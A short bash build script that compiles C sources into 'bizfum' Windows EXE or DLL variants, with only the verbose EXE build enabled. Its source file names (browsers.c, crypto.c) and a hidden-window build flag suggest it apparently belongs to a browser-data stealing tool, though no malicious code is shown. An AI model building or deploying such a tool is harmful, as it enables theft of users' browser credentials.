#!/bin/bash

clear
TYPE="exe"
VERBOSE="verbose"
CFLAGS="-O3 -w"
parse_args() {
    if [[ -z "$1" ]]; then return; fi
    if [[ "$1" == "-t" ]]; then
        VERBOSE="$2"
        shift 2
        parse_args "$@"
    elif [[ "$1" == "-f" ]]; then
        TYPE="$2"
        shift 2
        parse_args "$@"
    else
        echo "Invalid option: $1"
        exit 1
    fi
}
parse_args "$@"
if [[ "$VERBOSE" != "verbose" && "$VERBOSE" != "normal" ]]; then
    echo "Invalid verbosity option! Use 'verbose' or 'normal'."
    exit 1
fi

if [[ "$TYPE" != "dll" && "$TYPE" != "exe" ]]; then
    echo "Invalid file type option! Use 'dll' or 'exe'."
    exit 1
fi
if [[ "$TYPE" == "exe" ]]; then
    if [[ "$VERBOSE" == "verbose" ]]; then
        echo "Building verbose EXE version..."
        gcc src/verbose/*.c $CFLAGS -o bizfum-verbose.exe
    else
        echo "Unfortunately feature not supported yet. Use default. (-t verbose -f exe)"
        # echo "Building normal EXE version..."
        # gcc src/normal/*.c $CFLAGS -o bizfum.exe -mwindows
    fi
elif [[ "$TYPE" == "dll" ]]; then
    if [[ "$VERBOSE" == "verbose" ]]; then
        echo "Unfortunately feature not supported yet. Use default. (-t verbose -f exe)"
        # echo "Building verbose DLL version..."
        # gcc src/verbose/DLL/dll_main.c src/verbose/browsers.c src/verbose/crypto.c $CFLAGS -DVERBOSE -shared -o bizfum-verbose.dll
    else
        echo "Unfortunately feature not supported yet. Use default. (-t verbose -f exe)"
        # echo "Building normal DLL version..."
        # gcc src/normal/DLL/dll_main.c src/normal/browsers.c src/normal/crypto.c $CFLAGS -shared -o bizfum.dll
    fi
fi
if [[ $? -ne 0 ]]; then
    echo "Compilation failed!"
    exit 1
fi
echo "Compilation finished successfully."
